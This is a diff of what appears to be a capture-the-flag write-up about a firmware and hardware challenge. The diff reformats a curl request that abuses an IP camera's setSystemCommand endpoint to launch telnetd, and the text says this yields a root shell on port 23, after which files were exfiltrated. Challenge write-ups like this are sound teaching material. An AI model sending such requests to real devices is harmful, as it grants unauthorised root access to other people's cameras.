@@ -100,7 +100,13 @@ As for what challenges you can expect, there is mix of firmware and hardware cha
 
 Essentially, you would issue a http request to the IP camera using the following:
 
-`curl 'http://$CAMERA_IP/setSystemCommand' -H 'Authorization: Basic $BASICAUTH_CREDS' -H 'Content-Type: application/x-www-form-urlencoded' --data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm&SystemCommand=telnetd&ConfigSystemCommand=Save'`
+```curl 'http://$CAMERA_IP/setSystemCommand'
+-H 'Authorization: Basic $BASICAUTH_CREDS'
+-H 'Content-Type: application/x-www-form-urlencoded'
+--data 'ReplySuccessPage=docmd.htm
+        &ReplyErrorPage=docmd.htm
+        &SystemCommand=telnetd
+        &ConfigSystemCommand=Save'```
 
 This causes the camera to start a telnetd session which can be connected to at port 23. Upon connecting you'll see a root shell. At this point, we had to exfil several files to get the flag.
 
